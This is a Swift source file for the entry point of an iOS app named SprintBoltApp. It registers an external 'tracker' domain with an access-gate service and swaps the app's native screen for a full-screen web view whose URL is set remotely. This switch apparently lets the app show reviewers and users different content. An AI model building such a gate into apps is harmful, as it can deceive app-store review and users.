import SwiftUI

@main
struct SprintBoltApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    @StateObject private var appStateManager = AppStateManager.shared

    init() {
        AccessGateService.shared.setTrackerURL("https://selanooriental.online")
        configureNavigationBarAppearance()
    }
    
    var body: some Scene {
        WindowGroup {
            Group {
                if appStateManager.isLoading {
                    LoadingScreen()
                } else if appStateManager.shouldShowWebView, let url = appStateManager.webViewURL {
                    ExternalWebView(urlString: url)
                        .onAppear {
                            OrientationManager.shared.setWebViewActive(true)
                        }
                        .onDisappear {
                            OrientationManager.shared.setWebViewActive(false)
                        }
                } else {
                    ContentView()
                        .onAppear {
                            OrientationManager.shared.setWebViewActive(false)
                        }
                }
            }
            .preferredColorScheme(.dark)
        }
    }
    
    private func configureNavigationBarAppearance() {
        let appearance = UINavigationBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor(AppColors.backgroundPrimary)
        appearance.titleTextAttributes = [.foregroundColor: UIColor.white]
        appearance.largeTitleTextAttributes = [.foregroundColor: UIColor.white]
        
        UINavigationBar.appearance().standardAppearance = appearance
        UINavigationBar.appearance().compactAppearance = appearance
        UINavigationBar.appearance().scrollEdgeAppearance = appearance
        UINavigationBar.appearance().tintColor = UIColor(AppColors.boltRed)
    }
}

class AppDelegate: NSObject, UIApplicationDelegate {

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil
    ) -> Bool {
        return true
    }

    func application(
        _ application: UIApplication,
        supportedInterfaceOrientationsFor window: UIWindow?
    ) -> UIInterfaceOrientationMask {
        if OrientationManager.shared.isWebViewActive {
            return .allButUpsideDown
        } else {
            return .portrait
        }
    }
}
